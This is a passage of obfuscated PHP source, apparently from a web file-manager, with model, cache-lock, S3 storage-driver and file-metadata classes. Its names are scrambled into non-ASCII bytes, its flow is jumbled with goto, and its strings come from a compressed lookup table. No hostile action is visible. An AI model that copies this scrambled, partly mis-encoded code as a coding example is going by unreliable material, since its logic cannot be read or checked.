$this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($CîˆÊ×Œø = array()) { goto EÂÌ÷ÄöØÌ; EÂÌ÷ÄöØÌ: $cÅ¸“ôÁÁ =& $_SERVER[¿õñ]; $b°¨‘šİ = self::SQL_WHERE_IN_CHUNK; $eŒ§Ö‘Šä’ = $this->optionsValue(); goto c—Æ²»İÆ; Cµíæ¬àÕ—: $a¿ïİ¦Õ©œ = null; for ($AÏÚµƒĞ» = 0; $AÏÚµƒĞ» < count($AÉ…ğ¶Ëöï); $AÏÚµƒĞ» += $b°¨‘šİ) { $E £ÆÒ¦¬ = array_slice($AÉ…ğ¶Ëöï, $AÏÚµƒĞ», $b°¨‘šİ); if (!is_array($E £ÆÒ¦¬) || count($E £ÆÒ¦¬) == 0) { break; } $eŒ§Ö‘Šä’[$cÅ¸“ôÁÁ[260]][$B§æ–È][1] = $E £ÆÒ¦¬; $this->optionsValue($eŒ§Ö‘Šä’); $cš¨ŞŒ§Ç = parent::select($CîˆÊ×Œø); if (!$cš¨ŞŒ§Ç) { continue; } if (is_null($a¿ïİ¦Õ©œ)) { $a¿ïİ¦Õ©œ = array(); } $a¿ïİ¦Õ©œ = array_merge($a¿ïİ¦Õ©œ, $cš¨ŞŒ§Ç); } return $a¿ïİ¦Õ©œ; goto d½œø‘¿…­; c—Æ²»İÆ: $B§æ–È = $this->findWhereField($eŒ§Ö‘Šä’); if (!$B§æ–È || isset($eŒ§Ö‘Šä’[$cÅ¸“ôÁÁ[277]]) || isset($eŒ§Ö‘Šä’[$cÅ¸“ôÁÁ[336]])) { return parent::select($CîˆÊ×Œø); } $AÉ…ğ¶Ëöï = $eŒ§Ö‘Šä’[$cÅ¸“ôÁÁ[260]][$B§æ–È][1]; goto Cµíæ¬àÕ—; d½œø‘¿…­: } public function delete($f±—¿¿Ï¶ = array()) { goto cØÔ“¨½Íø; cØÔ“¨½Íø: $aå¬’É¼ƒ¶ =& $_SERVER[¿õñ]; $D†¨•ËÊçŒ = self::SQL_WHERE_IN_CHUNK; $d‹ÃÊñŒ×Ü = $this->optionsValue(); goto a­ªçÏñ„Ú; a­ªçÏñ„Ú: $BÔ÷ç£ = $this->findWhereField($d‹ÃÊñŒ×Ü); if (!$BÔ÷ç£) { return parent::delete($f±—¿¿Ï¶); } $fƒÅ¬í›š¦ = 0; goto DÎ£©Ïòï¡; DÎ£©Ïòï¡: $b¨©¹ âš© = $d‹ÃÊñŒ×Ü[$aå¬’É¼ƒ¶[260]][$BÔ÷ç£][1]; for ($CïšŒëÅ¾ = 0; $CïšŒëÅ¾ < count($b¨©¹ âš©); $CïšŒëÅ¾ += $D†¨•ËÊçŒ) { $FÖ¤–ö×ñÂ = array_slice($b¨©¹ âš©, $CïšŒëÅ¾, $D†¨•ËÊçŒ); if (!is_array($FÖ¤–ö×ñÂ) || count($FÖ¤–ö×ñÂ) == 0) { break; } $d‹ÃÊñŒ×Ü[$aå¬’É¼ƒ¶[260]][$BÔ÷ç£][1] = $FÖ¤–ö×ñÂ; $this->optionsValue($d‹ÃÊñŒ×Ü); $fƒÅ¬í›š¦ += parent::delete($f±—¿¿Ï¶); } return $fƒÅ¬í›š¦; goto aÂÍ½Äİ; aÂÍ½Äİ: } private function findWhereField($fä–°á¯‡) { $C¤ÛêĞ†¦ =& $_SERVER[¿õñ]; $eİÂìƒİñì = self::SQL_WHERE_IN_CHUNK; if (!is_array($fä–°á¯‡) || !is_array($fä–°á¯‡[$C¤ÛêĞ†¦[260]])) { return !1; } foreach ($fä–°á¯‡[$C¤ÛêĞ†¦[260]] as $Aˆ¹ƒÀö“© => $BÉ¹İÍ£ÎÁ) { if (is_array($BÉ¹İÍ£ÎÁ) && isset($BÉ¹İÍ£ÎÁ[0]) && is_string($BÉ¹İÍ£ÎÁ[0]) && strtolower($BÉ¹İÍ£ÎÁ[0]) == $C¤ÛêĞ†¦[7] && is_array($BÉ¹İÍ£ÎÁ[1]) && count($BÉ¹İÍ£ÎÁ[1]) > $eİÂìƒİñì) { ignore_timeout(); return $Aˆ¹ƒÀö“©; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\145\155\x4f\160\164\151\x6f\156"; public $field = array(); public function listData($b–¥¾ùˆç = false, $f•Ê‹ŸÙ = "\x6d\x6f\144\151\x66\171\x54\x69\155\x65", $e‚à„Ö–Ñ… = false) { $f©†Š„™ìö = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$b–¥¾ùˆç) { $f©†Š„™ìö = array_filter(array_values($f©†Š„™ìö)); return array_sort_by($f©†Š„™ìö, $f•Ê‹ŸÙ, $e‚à„Ö–Ñ…); } return $f©†Š„™ìö[$_SERVER[¿õñ][361] . $b–¥¾ùˆç]; } public function insert($dÖÅŠ¦õ¾) { goto E†ÒÊŒ¼•†; d»ó­°äã¼: return $FÌª¤¹ª„…; goto D©ìÏÁ™‚Š; E†ÒÊŒ¼•†: $d­Œ›±í” =& $_SERVER[¿õñ]; $dÖÅŠ¦õ¾ = array_field_key($dÖÅŠ¦õ¾, $this->field); $FÌª¤¹ª„… = Model($this->modelType)->get($d­Œ›±í”[362], $this->optionType . $d­Œ›±í”[363]); goto EŠ›æå´„Ú; EŠ›æå´„Ú: $FÌª¤¹ª„… = $FÌª¤¹ª„… ? $FÌª¤¹ª„… : 0; $dÖÅŠ¦õ¾[$d­Œ›±í”[364]] = ++$FÌª¤¹ª„…; $dÖÅŠ¦õ¾[$d­Œ›±í”[184]] = time(); goto dõîñ‘‹Ì; dõîñ‘‹Ì: $dÖÅŠ¦õ¾[$d­Œ›±í”[106]] = time(); Model($this->modelType)->set($d­Œ›±í”[362], $FÌª¤¹ª„…, $this->optionType . $d­Œ›±í”[363]); Model($this->modelType)->set($d­Œ›±í”[361] . $FÌª¤¹ª„…, $dÖÅŠ¦õ¾, $this->optionType); goto d»ó­°äã¼; D©ìÏÁ™‚Š: } public function update($D—‘¾º¨è, $AèÄÆ³š†¡) { goto f’ğ¦èß‘’; f’ğ¦èß‘’: $Fµùˆâ‚£Ø =& $_SERVER[¿õñ]; $AèÄÆ³š†¡ = array_field_key($AèÄÆ³š†¡, $this->field); $cÊõçÇ‘Œ› = $this->listData($D—‘¾º¨è); goto bâ¾á±åª¾; bÉ›Î’Ş“: return Model($this->modelType)->set($Fµùˆâ‚£Ø[361] . $D—‘¾º¨è, $AèÄÆ³š†¡, $this->optionType); goto EµÁ°¹·ÔÉ; bâ¾á±åª¾: if (!$cÊõçÇ‘Œ›) { return !1; } $AèÄÆ³š†¡ = array_merge($cÊõçÇ‘Œ›, $AèÄÆ³š†¡); $AèÄÆ³š†¡[$Fµùˆâ‚£Ø[106]] = time(); goto bÉ›Î’Ş“; EµÁ°¹·ÔÉ: } public function remove($eª©È Ä¢£) { return Model($this->modelType)->remove($_SERVER[¿õñ][361] . $eª©È Ä¢£, $this->optionType); } public function clear() { $fçÉÙíİ› =& $_SERVER[¿õñ]; Model($this->modelType)->remove($fçÉÙíİ›[362], $this->optionType . $fçÉÙíİ›[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($EÑÆìÛ, $D”©‘‚ò) { if (!$D”©‘‚ò) { return !1; } $aêÈ×•Ëˆ = $this->listData(); $aêÈ×•Ëˆ = array_to_keyvalue($aêÈ×•Ëˆ, $EÑÆìÛ); return isset($aêÈ×•Ëˆ[$D”©‘‚ò]) ? $aêÈ×•Ëˆ[$D”©‘‚ò] : !1; } public function findByName($bÊåÈß‚òŸ) { return $this->findByKey($_SERVER[¿õñ][28], $bÊåÈß‚òŸ); } protected function resetData($F÷Óß†Æ“Ñ) { $f‹¸½Ë¯¨‘ =& $_SERVER[¿õñ]; $AùÌÓä²Ùº = array(); for ($dŒ‘´¾öïî = 0; $dŒ‘´¾öïî < count($F÷Óß†Æ“Ñ); $dŒ‘´¾öïî++) { $AùÌÓä²Ùº[$f‹¸½Ë¯¨‘[361] . $F÷Óß†Æ“Ñ[$dŒ‘´¾öïî][$f‹¸½Ë¯¨‘[364]]] = $F÷Óß†Æ“Ñ[$dŒ‘´¾öïî]; } return Model($this->modelType)->set($AùÌÓä²Ùº, !1, $this->optionType); } private function getAutoName($f•˜Æé¼×·) { $Dª‡«ÕŠŒ = array_to_keyvalue($this->listData(), $_SERVER[¿õñ][28]); if (!$Dª‡«ÕŠŒ || !isset($Dª‡«ÕŠŒ[$f•˜Æé¼×·])) { return $f•˜Æé¼×·; } for ($b„‚«°‘Ô¹ = 1; $b„‚«°‘Ô¹ < count($Dª‡«ÕŠŒ); $b„‚«°‘Ô¹++) { $cÒ‰ĞÍ«İ = $f•˜Æé¼×· . "\x28{$b„‚«°‘Ô¹}\x29"; if (!isset($Dª‡«ÕŠŒ[$cÒ‰ĞÍ«İ])) { return $cÒ‰ĞÍ«İ; } } return $cÒ‰ĞÍ«İ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($DÍÑç„Ïì = false, $F…¿¹Ò¢Ú§ = '', $eœÍóà¬¿ß = false) { goto dÌ—¯ëŞÓÔ; aøƒ‘’¥Öª: foreach ($dêØ‰ãùÎÎ as $dœ¢óŸ³¢á => $CÎ—•Œœ˜Ã) { if ($eœÍóà¬¿ß || in_array($dœ¢óŸ³¢á, $this->jsonField)) { $dêØ‰ãùÎÎ[$dœ¢óŸ³¢á] = json_decode($dêØ‰ãùÎÎ[$dœ¢óŸ³¢á], !0); } } $this->cacheSet($F…¿¹Ò¢Ú§, $dêØ‰ãùÎÎ); return $DÍÑç„Ïì ? $dêØ‰ãùÎÎ[$DÍÑç„Ïì] : $dêØ‰ãùÎÎ; goto cê®‚¹—¾‘; dÌ—¯ëŞÓÔ: $a±Ü×°÷›ç =& $_SERVER[¿õñ]; $dêØ‰ãùÎÎ = $this->cacheGet($F…¿¹Ò¢Ú§); if (is_array($dêØ‰ãùÎÎ)) { return $DÍÑç„Ïì ? isset($dêØ‰ãùÎÎ[$DÍÑç„Ïì]) ? $dêØ‰ãùÎÎ[$DÍÑç„Ïì] : null : $dêØ‰ãùÎÎ; } goto BÉŸˆç¯©á; BÉŸˆç¯©á: $cÛÎîÌïÂŞ = $this->filterWhere(array($a±Ü×°÷›ç[29] => $F…¿¹Ò¢Ú§)); $dêØ‰ãùÎÎ = $this->where($cÛÎîÌïÂŞ)->select(); $dêØ‰ãùÎÎ = array_to_keyvalue($dêØ‰ãùÎÎ, $a±Ü×°÷›ç[88], $a±Ü×°÷›ç[354]); goto aøƒ‘’¥Öª; cê®‚¹—¾‘: } public function set($B ©Õ›ª¡÷, $dî‹‹ë¯ì“ = false, $FŞ•§ëÜƒÎ = '') { $eÖ«¤ÃÎŒõ =& $_SERVER[¿õñ]; $this->cacheRemove($FŞ•§ëÜƒÎ); $C·ÂÀˆñŠ­ = array(); $fÎ’Œ¯Âš = is_array($B ©Õ›ª¡÷) ? $B ©Õ›ª¡÷ : array($B ©Õ›ª¡÷ => $dî‹‹ë¯ì“); foreach ($fÎ’Œ¯Âš as $B ©Õ›ª¡÷ => $fŸ÷¿ÁğÖæ) { if (is_array($fŸ÷¿ÁğÖæ)) { $fŸ÷¿ÁğÖæ = json_encode_force($fŸ÷¿ÁğÖæ); } $this->checkLength($fŸ÷¿ÁğÖæ); $fŸ÷¿ÁğÖæ = self::textEncode($fŸ÷¿ÁğÖæ); $fÎ’Œ¯Âš = array($eÖ«¤ÃÎŒõ[29] => $FŞ•§ëÜƒÎ, $eÖ«¤ÃÎŒõ[88] => $B ©Õ›ª¡÷, $eÖ«¤ÃÎŒõ[354] => $fŸ÷¿ÁğÖæ); $C·ÂÀˆñŠ­[] = $this->filterWhere($fÎ’Œ¯Âš); } return $this->addAll($C·ÂÀˆñŠ­, array(), !0); } public function setDeep($A•ó‰„††’, $eÁ¬¼–½ç¤ = false, $CùØŸÊ‰»­ = '') { $E¥Œòõå¯ˆ = explode($_SERVER[¿õñ][92], $A•ó‰„††’); $cïĞÖ™£á¤ = $this->get(); array_set_value($cïĞÖ™£á¤, $A•ó‰„††’, $eÁ¬¼–½ç¤); $this->set($E¥Œòõå¯ˆ[0], $cïĞÖ™£á¤[$E¥Œòõå¯ˆ[0]], $CùØŸÊ‰»­); } public function remove($fìè‡¦İîã, $bØ÷Ç¾¶›ã = '') { $aõàòƒÙİ =& $_SERVER[¿õñ]; $this->CacheRemove($bØ÷Ç¾¶›ã); $AòÍ§‹ß” = $this->filterWhere(array($aõàòƒÙİ[88] => $fìè‡¦İîã, $aõàòƒÙİ[29] => $bØ÷Ç¾¶›ã)); if (is_null($fìè‡¦İîã)) { unset($AòÍ§‹ß”[$aõàòƒÙİ[88]]); } return $this->where($AòÍ§‹ß”)->delete(); } public function cacheSet($Cºˆ¼„“‡Ş, $bŠ¯ åÈå² = false) { return Cache::set($this->cacheKey($Cºˆ¼„“‡Ş), $bŠ¯ åÈå²); } public function cacheGet($aĞÌ‰…œ½˜) { return Cache::get($this->cacheKey($aĞÌ‰…œ½˜)); } public function cacheRemove($F‘„İãŸˆÜ) { return Cache::remove($this->cacheKey($F‘„İãŸˆÜ)); } protected function filterWhere($C¤Ç§ò¾«Ì) { return $C¤Ç§ò¾«Ì; } protected function cacheKey($fùÑÁîÓôù) { return $fùÑÁîÓôù; } } goto eøø‰ƒ…ÒÎ; Dİ‰ÜâíµÍ: define($_SERVER[¿õñ][224], 2); define($_SERVER[¿õñ][225], 3); define($_SERVER[¿õñ][226], 1); goto fÛ«‘”½é¶; bİô¿æŞ¥„: class CacheLockMemcached { public function lock($Bì„¢ö°‡”, $eÕ·ŒÓÆÀ = 0) { $dÖÛÅÉÁ = Cache::init(); $fİ¼ô˜Â = microtime(!0) + $eÕ·ŒÓÆÀ; while (microtime(!0) < $fİ¼ô˜Â) { $cÎÜ¢ÁĞí = $dÖÛÅÉÁ->get($Bì„¢ö°‡”); if (!$cÎÜ¢ÁĞí || $cÎÜ¢ÁĞí < microtime(!0)) { $aË‹ÀùÅòé = $dÖÛÅÉÁ->handle->add($Bì„¢ö°‡”, $fİ¼ô˜Â, $eÕ·ŒÓÆÀ); if ($aË‹ÀùÅòé) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($e·Õ¢›à) { return Cache::init()->get($e·Õ¢›à); } public function unlock($aøµ•àÛ„ê) { return Cache::init()->remove($aøµ•àÛ„ê); } } class CacheLockDatabase { public function lock($D¿ŞÓÉñ…š, $Aòá¿ÔŒî´ = 0) { $cÉŒÓÀˆŠì = Model($_SERVER[¿õñ][762]); $AíËˆ‘¬¯ß = microtime(!0) + $Aòá¿ÔŒî´; while (microtime(!0) < $AíËˆ‘¬¯ß) { $fº÷Ğ¼Éä¯ = $cÉŒÓÀˆŠì->get($D¿ŞÓÉñ…š); if (!$fº÷Ğ¼Éä¯ || $fº÷Ğ¼Éä¯ < microtime(!0)) { $Cµò‹¬Ô = $cÉŒÓÀˆŠì->set($D¿ŞÓÉñ…š, $AíËˆ‘¬¯ß); if ($Cµò‹¬Ô) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BêØè¯Ø) { return Model($_SERVER[¿õñ][762])->get($BêØè¯Ø); } public function unlock($bÌğã¸Ñß¸) { Model($_SERVER[¿õñ][762])->remove($bÌğã¸Ñß¸); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($EšŠŠ¿é, $Bë¶Ñ¿É‘›) { $aèßî«œ¯‡ =& $_SERVER[¿õñ]; if (!class_exists($aèßî«œ¯‡[790])) { show_json($aèßî«œ¯‡[791], !1); } $this->cacheTime = $Bë¶Ñ¿É‘›; $this->handle = new Memcached(); if (is_array($EšŠŠ¿é[$aèßî«œ¯‡[792]]) && count($EšŠŠ¿é[$aèßî«œ¯‡[792]]) >= 1) { foreach ($EšŠŠ¿é[$aèßî«œ¯‡[792]] as $Dóœ³ºè×İ) { $dã±´·ƒæ‘ = explode($aèßî«œ¯‡[4], $Dóœ³ºè×İ); $this->handle->addServer($dã±´·ƒæ‘[0], $dã±´·ƒæ‘[1]); } } else { $this->handle->addServer($EšŠŠ¿é[$aèßî«œ¯‡[166]], $EšŠŠ¿é[$aèßî«œ¯‡[167]]); } } public function set($B¾¶Ï„ÂÏù, $DàĞĞß×Ë, $BÙ˜…ËçË = false) { $BÙ˜…ËçË = $BÙ˜…ËçË ? $BÙ˜…ËçË : $this->cacheTime; return $this->handle->set($B¾¶Ï„ÂÏù, $DàĞĞß×Ë, $BÙ˜…ËçË); } public function get($E¬¨¸‘ÎÛ®) { return $this->handle->get($E¬¨¸‘ÎÛ®); } public function remove($F¸¢õ…Òï) { return $this->handle->delete($F¸¢õ…Òï); } public function deleteAll() { return $this->handle->flush(); } } goto aª’Ûƒîé…; dÒá×èÑĞ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($c‘¬ˆÕÂ‹) { parent::__construct($c‘¬ˆÕÂ‹); $this->signatureVersion($_SERVER[¿õñ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Dï”ËìÔî) { header($_SERVER[¿õñ][153] . $Dï”ËìÔî); die; } } class PathDriverNOS extends PathDriverBaseS3 { public function __construct($bÔÙˆßÔÕ) { parent::__construct($bÔÙˆßÔÕ); $this->client->setSignatureVersion($_SERVER[¿õñ][197]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function setContent($Fù´“ã’§, $fäß°Òˆ³ì = '', $aÇåíºù˜• = false) { $F²ùÆèÎÜ =& $_SERVER[¿õñ]; $Fù´“ã’§ = $aÇåíºù˜• ? trim($Fù´“ã’§, $F²ùÆèÎÜ[8]) . $F²ùÆèÎÜ[8] : $Fù´“ã’§; $EÌÀÂå‘áí = get_file_mime(get_path_ext($Fù´“ã’§)); $bÎÑÔÀË©ë = $this->client->putObject($fäß°Òˆ³ì, $this->bucket, $Fù´“ã’§, $F²ùÆèÎÜ[182], array(), $EÌÀÂå‘áí); return $bÎÑÔÀË©ë ? !0 : !1; } public function upload($f·§Êá›”, $E…ËË¼íº©, $fÊêïä„ = false, $bòß½¡ÛŞÊ = REPEAT_REPLACE) { $eˆøäÍ‡á¬ =& $_SERVER[¿õñ]; $EªŠ¥î»ÓÍ = array(); $Fê•‰ä… = array($eˆøäÍ‡á¬[196] => get_file_mime(get_path_ext($f·§Êá›”))); if (IO::size($E…ËË¼íº©) <= 1024 * 1024 * 200) { $c†£—šµ = $this->client->putObjectFile($E…ËË¼íº©, $this->bucket, $f·§Êá›”, $eˆøäÍ‡á¬[182], $EªŠ¥î»ÓÍ, $Fê•‰ä…); return !empty($c†£—šµ) ? !0 : !1; } $FÔºªÒ“Û³ = $this->client->multiUploadObject($E…ËË¼íº©, $this->bucket, trim($f·§Êá›”, $eˆøäÍ‡á¬[8]), $EªŠ¥î»ÓÍ, $Fê•‰ä…); return $FÔºªÒ“Û³ ? $this->getPathOuter($f·§Êá›”) : !1; } public function blockChain($c¾äÔµ«ø, $cÍµİî™Ğõ) { $c¼Ì‰ˆÉ =& $_SERVER[¿õñ]; $F Ô†‚­ˆ¨ = $this->objectMeta($c¾äÔµ«ø); if (!$F Ô†‚­ˆ¨) { return !1; } return $this->client->copyObject($this->bucket, $c¾äÔµ«ø, $this->bucket, $c¾äÔµ«ø, $c¼Ì‰ˆÉ[182], array(), $cÍµİî™Ğõ, $c¼Ì‰ˆÉ[1139], !0); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($a“ÒñÏÓÓ—) { parent::__construct($a“ÒñÏÓÓ—); $this->signatureVersion($_SERVER[¿õñ][197]); } } goto F˜Ú¦ïÅá; cĞêÔ‡¬ÉŸ: define($_SERVER[¿õñ][0], $_SERVER[¿õñ][1]); $_SERVER[ĞÌÅˆ•ÉíŒÆÆ] = explode($_SERVER[¿õñ][2], gzinflate(substr($_SERVER[¿õñ][3], 10, -8))); function Model($BÚ¦¡á¢‹ = '', $A•ÆáòÉ» = '', $FÅÚŒ¨Îáš = '') { goto Aî’ŞñŒ°ñ; CĞê½Îœ•±: if (isset($fƒÌÂÎˆÕ[$AÖæ·ÂÎ])) { return $fƒÌÂÎˆÕ[$AÖæ·ÂÎ]; } if ($BÚ¦¡á¢‹) { $BÚ¦¡á¢‹ = strtoupper($BÚ¦¡á¢‹[0]) . substr($BÚ¦¡á¢‹, 1); $Aº¡âÅÕ…Á = $BÚ¦¡á¢‹ . $a½™ƒñçáÉ[1]; if (class_exists($Aº¡âÅÕ…Á)) { $fƒÌÂÎˆÕ[$AÖæ·ÂÎ] = new $Aº¡âÅÕ…Á(); return $fƒÌÂÎˆÕ[$AÖæ·ÂÎ]; } } if (!$FÅÚŒ¨Îáš) { $FÅÚŒ¨Îáš = $GLOBALS[$a½™ƒñçáÉ[2]][$a½™ƒñçáÉ[3]]; } goto FÀ®£±ù¥¢; Aî’ŞñŒ°ñ: $a½™ƒñçáÉ =& $_SERVER[ĞÌÅˆ•ÉíŒÆÆ]; static $fƒÌÂÎˆÕ = array(); $AÖæ·ÂÎ = strtolower($A•ÆáòÉ» . $a½™ƒñçáÉ[0] . $BÚ¦¡á¢‹); goto CĞê½Îœ•±; FÀ®£±ù¥¢: $fƒÌÂÎˆÕ[$AÖæ·ÂÎ] = new ModelBase($BÚ¦¡á¢‹, $A•ÆáòÉ», $FÅÚŒ¨Îáš); return $fƒÌÂÎˆÕ[$AÖæ·ÂÎ]; goto C¤ÕØİÈ¡Ë; C¤ÕØİÈ¡Ë: } goto a‘‰ê‘ÚóÊ; f­•’ì³Ï: class GetInfo { private static $fileTypeArray; public static function get($dƒ‘äïÆ°Ÿ) { $D‘­Œ’ù¿¥ = IO::info($dƒ‘äïÆ°Ÿ); return self::infoAdd($D‘­Œ’ù¿¥); } public static function infoAdd(&$Aİ”« ä§¾) { goto a©²¥²¥Ÿ˜; c²„¡†ê¹: if (!$Aİ”« ä§¾ || $Aİ”« ä§¾[$C ’ìíŞƒ‰[29]] != $C ’ìíŞƒ‰[164]) { return; } if (!self::support($Aİ”« ä§¾[$C ’ìíŞƒ‰[157]]) || isset($Aİ”« ä§¾[$C ’ìíŞƒ‰[422]])) { return; } $B¤ÎÍ‘†ÍÊ = $C ’ìíŞƒ‰[1520] . $Aİ”« ä§¾[$C ’ìíŞƒ‰[76]]; goto a–ùàÅÃˆ; a©²¥²¥Ÿ˜: $C ’ìíŞƒ‰ =& $_SERVER[¿õñ]; static $b³êÄË­Ëæ; if (!$b³êÄË­Ëæ) { require SDK_DIR . $C ’ìíŞƒ‰[1519]; $b³êÄË­Ëæ = new getID3(); } goto c²„¡†ê¹; a–ùàÅÃˆ: $BÏö¡İ”ˆä = $Aİ”« ä§¾[$C ’ìíŞƒ‰[157]]; try { if ($Aİ”« ä§¾[$C ’ìíŞƒ‰[157]] == $C ’ìíŞƒ‰[1521]) { $cİíƒ¯¨¿È = self::psdParse($B¤ÎÍ‘†ÍÊ); $BÏö¡İ”ˆä = $C ’ìíŞƒ‰[1522]; } else { if ($Aİ”« ä§¾[$C ’ìíŞƒ‰[157]] == $C ’ìíŞƒ‰[1523]) { $cİíƒ¯¨¿È = self::pdfParse($B¤ÎÍ‘†ÍÊ); } else { $BÏö¡İ”ˆä = self::$fileTypeArray[$C ’ìíŞƒ‰[1524]][$Aİ”« ä§¾[$C ’ìíŞƒ‰[157]]]; $bÓÕ‡éŞèã = self::$fileTypeArray[$C ’ìíŞƒ‰[1525]][$BÏö¡İ”ˆä][$C ’ìíŞƒ‰[1526]]; $FÕ¢ç¾ëâ = @$b³êÄË­Ëæ->analyze($B¤ÎÍ‘†ÍÊ, $Aİ”« ä§¾[$C ’ìíŞƒ‰[78]], $Aİ”« ä§¾[$C ’ìíŞƒ‰[28]]); $cİíƒ¯¨¿È = self::parseData($FÕ¢ç¾ëâ, $bÓÕ‡éŞèã, $Aİ”« ä§¾); } } } catch (Exception $d‹´¤˜Ùğ†) { $cİíƒ¯¨¿È = array($C ’ìíŞƒ‰[369] => $BÏö¡İ”ˆä); } if (!$cİíƒ¯¨¿È) { return; } goto A¹ååÌî‡; A¹ååÌî‡: $cİíƒ¯¨¿È[$C ’ìíŞƒ‰[369]] = $BÏö¡İ”ˆä; $Aİ”« ä§¾[$C ’ìíŞƒ‰[422]] = $cİíƒ¯¨¿È; return $Aİ”« ä§¾; goto cêÉÈ×º; cêÉÈ×º: } public static function support($eòÀØ‡Ìï±) { goto bÍß¦Û; B„Ò‹‰Ù£Ñ: return !1; goto eÊ„äõŠà´; bÍß¦Û: $F¥åäáºò× =& $_SERVER[¿õñ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $eòÀØ‡Ìï± = strtolower($eòÀØ‡Ìï±); goto dÃÏ³¹«ŞÜ; dÃÏ³¹«ŞÜ: $e²›¸‚•° = array($F¥åäáºò×[1523], $F¥åäáºò×[1521]); if (in_array($eòÀØ‡Ìï±, $e²›¸‚•°)) { return !0; } if (isset(self::$fileTypeArray[$F¥åäáºò×[1524]][$eòÀØ‡Ìï±])) { return !0; } goto B„Ò‹‰Ù£Ñ; eÊ„äõŠà´: } private static function parseData($Dç¡øƒ¶Ğ¥, $a—‹Ş‰‘åŠ, $cï‹‘¢×¶°) { $d¬åÃÀ‡Âƒ =& $_SERVER[¿õñ]; $cç‰»£ Âˆ = $Dç¡øƒ¶Ğ¥[$d¬åÃÀ‡Âƒ[1527]]; $cé‰½ìê¦ = array(); foreach ($a—‹Ş‰‘åŠ as $C¤‚Ş›“¶Å => $Bª÷æˆàã­) { foreach ($Bª÷æˆàã­ as $c¢÷ÇÖ‹¼) { if (is_array($c¢÷ÇÖ‹¼)) { $cØ¼‘ÆÉ¯ = self::parseData($Dç¡øƒ¶Ğ¥, $Bª÷æˆàã­, $cï‹‘¢×¶°); if ($cØ¼‘ÆÉ¯) { $cé‰½ìê¦[$C¤‚Ş›“¶Å] = $cØ¼‘ÆÉ¯; } break; } $fÊî’„Ã…· = str_replace($d¬åÃÀ‡Âƒ[1305], $cç‰»£ Âˆ, $c¢÷ÇÖ‹¼); $cØ¼‘ÆÉ¯ = _get($Dç¡øƒ¶Ğ¥, $fÊî’„Ã…·); $cØ¼‘ÆÉ¯ = is_array($cØ¼‘ÆÉ¯) ? $cØ¼‘ÆÉ¯[0] : $cØ¼‘ÆÉ¯; if ($cØ¼‘ÆÉ¯) { break; } } if ($cØ¼‘ÆÉ¯ || $cØ¼‘ÆÉ¯ === 0 || $cØ¼‘ÆÉ¯ === !1) { $cØ¼‘ÆÉ¯ = self::valueReset($c¢÷ÇÖ‹¼, $cØ¼‘ÆÉ¯, $C¤‚Ş›“¶Å); if ($cØ¼‘ÆÉ¯ !== null) { $cé‰½ìê¦[$C¤‚Ş›“¶Å] = $cØ¼‘ÆÉ¯; } } } $cé‰½ìê¦ = self::valueResetAll($cé‰½ìê¦, $cï‹‘¢×¶°); return $cé‰½ìê¦; } private static function psdParse($DµÜĞÏ¤) { $a”áò´í® =& $_SERVER[¿õñ]; if (IO::fileSubstr($DµÜĞÏ¤, 0, 4) != $a”áò´í®[1528]) { return !1; } $C¡À‰ë«‚å = getImageSize($DµÜĞÏ¤, $EóÔÔ¨«‡î); if (!$C¡À‰ë«‚å) { return; } $bÂŒøğ÷³³ = array($a”áò´í®[1444] => $C¡À‰ë«‚å[0], $a”áò´í®[1446] => $C¡À‰ë«‚å[1]); return $bÂŒøğ÷³³; } private static function pdfParse($C¦ğº«á˜Ï) { return FileParsePdf::parse($C¦ğº«á˜Ï); } private static function fileTypeParse() { $E®Ê±Ü÷Ì” =& $_SERVER[¿õñ]; $D‡âæ–… = self::fileTypeArray(); $aß‰ï Š»Å = array(); foreach ($D‡âæ–… as $a¯Ê¹Û¼ˆÍ => $c„†ˆñ¿ƒ) { $FÅ„°ä‰Üù = _get($c„†ˆñ¿ƒ, $E®Ê±Ü÷Ì”[157], $E®Ê±Ü÷Ì”[33]); $FÓÌ°î¢©• = is_string($FÅ„°ä‰Üù) ? explode($E®Ê±Ü÷Ì”[47], $FÅ„°ä‰Üù) : $FÅ„°ä‰Üù; if (!$FÓÌ°î¢©•) { continue; } foreach ($FÓÌ°î¢©• as $FÅ„°ä‰Üù) { $FÅ„°ä‰Üù = strtolower(trim($FÅ„°ä‰Üù)); if (!$FÅ„°ä‰Üù) { continue; } $aß‰ï Š»Å[$FÅ„°ä‰Üù] = $a¯Ê¹Û¼ˆÍ; } $D‡âæ–…[$a¯Ê¹Û¼ˆÍ][$E®Ê±Ü÷Ì”[157]] = array_keys($aß‰ï Š»Å); $D‡âæ–…[$a¯Ê¹Û¼ˆÍ][$E®Ê±Ü÷Ì”[1526]] = self::parseKeyMap($c„†ˆñ¿ƒ[$E®Ê±Ü÷Ì”[1526]]); } return array($E®Ê±Ü÷Ì”[1525] => $D‡âæ–…, $E®Ê±Ü÷Ì”[1524] => $aß‰ï Š»Å); } private static function parseKeyMap($eÆ¢µ¤) { $A±éÅ‡ññš =& $_SERVER[¿õñ]; foreach ($eÆ¢µ¤ as $BšÀÔÚ“— => $b‹š ÔŞÑó) { if (is_array($b‹š ÔŞÑó)) { $c¬ŒÏ˜ÌÊ = self::parseKeyMap($b‹š ÔŞÑó); if ($c¬ŒÏ˜ÌÊ) { $eÆ¢µ¤[$BšÀÔÚ“—] = $c¬ŒÏ˜ÌÊ; } continue; } $D¼‹ÓÈ³µ¶ = explode($A±éÅ‡ññš[47], $b‹š ÔŞÑó); $dñ§È£¿¯í = array(); foreach ($D¼‹ÓÈ³µ¶ as $C“ë×ŒçÓ‘) { $C“ë×ŒçÓ‘ = trim($C“ë×ŒçÓ‘); if (!$C“ë×ŒçÓ‘) { 